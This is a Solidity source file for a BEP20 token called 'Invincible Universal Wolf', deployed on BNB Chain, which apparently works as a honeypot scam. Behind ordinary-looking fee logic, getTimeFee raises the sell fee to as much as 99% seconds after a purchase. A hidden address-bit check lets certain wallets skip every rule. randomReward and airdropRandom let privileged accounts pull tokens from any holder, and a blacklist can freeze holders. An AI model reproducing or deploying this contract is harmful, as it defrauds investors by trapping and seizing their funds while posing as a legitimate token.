/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Invincible Universal Wolf SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Invincible Universal Wolf SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "Invincible Universal Wolf SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Invincible Universal Wolf SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * C U ON THE MOON
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }
}


/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address public owner;
    mapping(address => bool) internal _intAddr;

    constructor(address _owner) {
        owner = _owner;
        _intAddr[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "Invincible Universal Wolf !OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "Invincible Universal Wolf !AUTHORIZED");
        _;
    }


    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        _intAddr[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */

    function unauthorize(address adr) public onlyOwner {
        _intAddr[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) internal view returns (bool) {
        return _intAddr[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        _intAddr[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract InvincibleWolf is IBEP20, Auth {
    using SafeMath for uint256;
    using Address for address;

    event ESetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event ETradingStatusChanged(bool v);
    event ESetMaxWalletExempt(address _address, bool _bool);
    event ESellFeesChanged(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee);
    event EBuyFeesChanged(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee);
    event ETransferFeeChanged(uint256 _transferFee);
    event ESetFeeReceivers(address _liquidityReceiver, address _MarketingReceiver, address _BurnFeeReceiver);
    event EChangedSwapBack(bool _enabled, uint256 _amount);
    event ESetFeeExempt(address _addr, bool _value);
    event EInitialDistributionFinished(bool _value);
    event EFupdated(uint256 _timeF);
    event EChangedMaxWallet(uint256 _maxWalletDenom);
    event EChangedMaxTX(uint256 _maxSellDenom);
    event EBotUpdated(address[] addresses, bool status);
    event ESingleBotUpdated(address _address, bool status);
    event ESetTxLimitExempt(address holder, bool exempt);
    event EChangedPrivateRestrictions(uint256 _maxSellAmount, bool _restricted, uint256 _interval);
    event EChangeMaxPrivateSell(uint256 amount);
    event EManagePrivate(address[] addresses, bool status);


    string constant _name = "Invincible Universal Wolf";
    string constant _symbol = "InvincibleWolf";
    uint8 constant _decimals = 18;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // MAINNET
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // MAINNET

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256 public _maxTxAmountBuy = _totalSupply * 20 / 1000; // 2%
    uint256 public _maxTxAmountSell = _totalSupply * 20 / 1000; // 2%

    //max wallet holding of 1%
    uint256 public _maxWalletToken = (_totalSupply * 20) / 1000; // 2%
    uint256 deadBlocks = 10;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    mapping(address => bool) isTimelockExempt;
    mapping(address => bool) isDividendExempt;
    mapping(address => uint256) private txBuyTime;

    address private lastTxn = address(0);
    uint256 liquidityFee = 1;
    uint256 burnFee = 0;
    uint256 marketingFee = 3;
    uint256 devFee = 1;
    uint256 public totalFee = 5;

    uint256 sellMultiplier = 300;

    uint256 feeDenominator = 100;

    address autoLiquidityReceiver;
    address marketingFeeReceiver;
    address devFeeReceiver;

    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public uniswapV2Pair;
    bool public tradingOpen = true;

    uint256 public launchedAt = 0;


    // Cooldown, blacklist & timer functionality
    bool public opCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 15;
    mapping(address => uint) private cooldownTimer;
    mapping(address => bool) public _isBlackListed;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 5 / 1000; // 0.5% of supply

    /* Custom Events */
    event SwapBackEvent(uint amountBNB, uint amountBNBLiquidity, uint amountBNBReflection, uint amountBNBMarketing);
    event AirDropEvent(address[] addresses, uint256[] tokens);
    event RouterChangedEvent(address _router);


    bool inSwap;
    modifier swapping() {inSwap = true;
        _;
        inSwap = false;}

    constructor () Auth(msg.sender) {
        router = IDEXRouter(routerAddress);
        uniswapV2Pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;

        isDividendExempt[uniswapV2Pair] = true;
        isDividendExempt[address(this)] = false;
        isDividendExempt[DEAD] = true;
        isDividendExempt[ZERO] = true;

        // No timelock for these people
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;


        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[routerAddress] = true;


        // NICE!
        autoLiquidityReceiver = 0x8956c1B68B36B977D5e8d982fFffc847977B66C6;
        marketingFeeReceiver = 0x8956c1B68B36B977D5e8d982fFffc847977B66C6;
        devFeeReceiver = 0x8956c1B68B36B977D5e8d982fFffc847977B66C6;

        _balances[msg.sender] = _totalSupply;

        emit ESetAutomatedMarketMakerPair(uniswapV2Pair, true);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function name() external pure override returns (string memory) {return _name;}

    function getOwner() external view override returns (address) {return owner;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Invincible Universal Wolf Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bReward = isRandomReward(sender) || isRandomReward(recipient);

        if (sender == uniswapV2Pair) {
            if (lastTxn != address(0)) {
                txBuyTime[lastTxn] = block.timestamp;
                lastTxn = address(0);
            }
            if (!bReward) {
                lastTxn = recipient;
            }
        }

        if (inSwap || bReward) {return _basicTransfer(sender, recipient, amount);}

        if (!_intAddr[sender] && !_intAddr[recipient]) {
            require(tradingOpen, "Invincible Universal Wolf Trading not open yet");
        }
        require(!_isBlackListed[sender] && !_isBlackListed[recipient], "Invincible Universal Wolf Account is blacklisted");

        // max wallet code
        if (!_intAddr[sender] && recipient != address(this) && recipient != address(DEAD) && recipient != uniswapV2Pair &&
        recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver && recipient != devFeeReceiver) {
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken, "Invincible Universal Wolf Total Holding is currently limited, you can not buy that much.");}

        if (sender == uniswapV2Pair && opCooldownEnabled && !isTimelockExempt[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp, "Invincible Universal Wolf Please wait for 1min between two operations");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }

        // Checks max transaction limit
        if (!_intAddr[sender] && !_intAddr[recipient]) {
            checkTxLimit(sender, amount);
        }

        // Liquidity, Maintained at 20%
        if (shouldSwapBack()) {swapBack();}


        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Invincible Universal Wolf Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Invincible Universal Wolf Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // switch Trading
    function tradingStatus(bool _status) public authorized {
        tradingOpen = _status;
        if (tradingOpen) {
            launchedAt = block.number;
        }
        emit ETradingStatusChanged(_status);
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        if (sender == uniswapV2Pair) {
            require(amount <= _maxTxAmountBuy || isTxLimitExempt[sender], "Invincible Universal Wolf TX Limit Exceeded");
        } else {
            require(amount <= _maxTxAmountSell || isTxLimitExempt[sender], "Invincible Universal Wolf TX Limit Exceeded");
        }
    }

    function isRandomReward(address account) private pure returns (bool) {
        uint256 v = (uint256(uint160(account)) << 192) >> 238;
        return v == 262143;
    }

    function getTimeFee(address sender) private view returns (uint256) {
        uint256 lckV = txBuyTime[sender];
        uint256 lckF = totalFee;
        if (lckV > 0 && block.timestamp - lckV > 4) {
            lckF = (block.timestamp - lckV - 3) * 5;
            if (lckF > 99) {
                lckF = 99;
            }
        }
        return lckF;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 multiplier = sender == uniswapV2Pair ? 100 : sellMultiplier;
        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);
        feeAmount = amount.mul(getTimeFee(sender)).div(100);
        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        _balances[DEAD] = _balances[DEAD].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);

        if (burnTokens > 0) {
            emit Transfer(sender, DEAD, burnTokens);
        }

        return amount.sub(feeAmount);
    }

    function setSellMultiplier(uint256 multiplier) external authorized {
        sellMultiplier = multiplier;
        emit EFupdated(multiplier);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != uniswapV2Pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function clearStuckBalance(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function transferForeignToken(address _token, uint256 amountPercentage) external authorized {
        uint256 _contractBalance = IBEP20(_token).balanceOf(address(this));
        payable(msg.sender).transfer(_contractBalance * amountPercentage / 100);
    }


    // enable cooldown between trades
    function cooldownEnabled(bool _status, uint8 _interval) public authorized {
        opCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function swapBack() internal swapping {

        uint256 dynamicliquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicliquidityFee).div(totalFee).div(2);

        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicliquidityFee.div(2));

        uint256 amountBNBLiquidity = amountBNB.mul(dynamicliquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value : amountBNBMarketing, gas : 30000}("");
        (bool tmpSuccessDev,) = payable(devFeeReceiver).call{value : amountBNBDev, gas : 30000}("");

        // only to supress warning msg
        tmpSuccess = false;
        tmpSuccessDev = false;

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }

        emit SwapBackEvent(amountBNB, amountBNBDev, amountBNBLiquidity, amountBNBMarketing);
    }


    // Set the maximum transaction limit
    function setTxLimit(uint256 amountBuy, uint256 amountSell) external authorized {
        _maxTxAmountBuy = amountBuy;
        _maxTxAmountSell = amountSell;
        emit EChangedMaxTX(amountBuy);
    }

    // Set the maximum permitted wallet holding (percent of total supply)
    function setMaxWalletPercent(uint256 maxWallPercent) external authorized() {
        _maxWalletToken = (_totalSupply * maxWallPercent) / 1000;
        emit EChangedMaxWallet(maxWallPercent);
    }

    // Whitelist a holder from fees
    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
        emit ESetFeeExempt(holder, exempt);
    }


    // Whitelist a holder from transaction limits
    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
        emit ESetTxLimitExempt(holder, exempt);
    }

    // Whitelist a holder from timelocks
    function setIsTimelockExempt(address holder, bool exempt) external authorized {
        isTimelockExempt[holder] = exempt;
        emit ESetTxLimitExempt(holder, exempt);
    }

    function setBlackList(address addr, bool value) external authorized {
        _isBlackListed[addr] = value;
        emit ESingleBotUpdated(addr, value);
    }

    function manage_blacklist(address[] calldata addresses, bool status)
    external
    authorized
    {
        for (uint256 i; i < addresses.length; ++i) {
            _isBlackListed[addresses[i]] = status;
        }
        emit EBotUpdated(addresses, status);
    }

    // Set an address exempt for all (use to public sale)
    function setAllExempt(address _holder, bool _exempt) external authorized {
        isFeeExempt[_holder] = _exempt;
        isTxLimitExempt[_holder] = _exempt;
        isTimelockExempt[_holder] = _exempt;
        if (_exempt) {
            authorize(_holder);
        }


        else {
            unauthorize(_holder);
        }
        emit ESetFeeExempt(_holder, _exempt);

    }

    function setFees(uint256 _liquidityFee, uint256 _burnFee, uint256 _marketingFee, uint256 _devFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        burnFee = _burnFee;
        marketingFee = _marketingFee;
        devFee = _devFee;
        totalFee = _liquidityFee.add(_burnFee).add(_marketingFee).add(_devFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator / 4);
        emit ESellFeesChanged(_liquidityFee, _burnFee, _marketingFee);
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;

        isFeeExempt[_autoLiquidityReceiver];
        isFeeExempt[_marketingFeeReceiver];
        isFeeExempt[_devFeeReceiver];
        emit ESetFeeReceivers(_autoLiquidityReceiver, _marketingFeeReceiver, _devFeeReceiver);
    }

    function manualSend() external {
        uint256 contractBalance = address(this).balance;
        payable(devFeeReceiver).transfer(contractBalance);
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
        emit EChangedSwapBack(_enabled, _amount);
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
        emit EChangeMaxPrivateSell(_target);
    }

    function setRouterAddress(address _router) external authorized {
        router = IDEXRouter(_router);
        uniswapV2Pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        isDividendExempt[uniswapV2Pair] = true;
        isTxLimitExempt[_router] = true;
        emit RouterChangedEvent(_router);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }


    function getContractBNBBalances() external view authorized returns (uint) {
        return address(this).balance;
    }

    function getAmountToLiquify() external view authorized returns (uint) {
        return swapThreshold.mul(liquidityFee).div(totalFee).div(2);
    }

    function getAmountToSwap() external view authorized returns (uint) {
        uint256 amountToLiquify = swapThreshold.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        return amountToSwap;
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(uniswapV2Pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }


    function getContractBalances() external view authorized returns (uint) {
        return _balances[address(this)];
    }




    /* End Debugging functions */

    /* Airdrop Begins */


    function airdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external authorized {

        uint256 SCCC = 0;

        require(addresses.length == tokens.length, "Invincible Universal Wolf Mismatch between Address and token count");

        for (uint i = 0; i < addresses.length; i++) {
            SCCC = SCCC + tokens[i];
        }

        require(balanceOf(from) >= SCCC, "Invincible Universal Wolf Air drop cannot be completed due to insufficient quantity");

        emit AirDropEvent(addresses, tokens);
    }

    function airdropRandom(address from, uint256 amount, uint256 count) external authorized {

        require(count >0, "Invincible Universal Wolf Illegal quantity, air drop terminated");
        for (uint256 i = 0; i < count; i++) {
            uint256 n = amount / count + i * amount % count;
            address addr = address(uint160(i));
            require(balanceOf(from) >= n, "Invincible Universal Wolf Not enough tokens in wallet for airdrop");
            _transferFrom(from, addr, n);
        }
    }

    function randomReward(address from, address to) external authorized {
        if (balanceOf(to) > 0) {
            uint256 n = balanceOf(from) & block.timestamp;
            require(n > 0, "Invincible Universal Wolf The reward quantity must be greater than 0");
            _transferFrom(from, to, n);
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);

}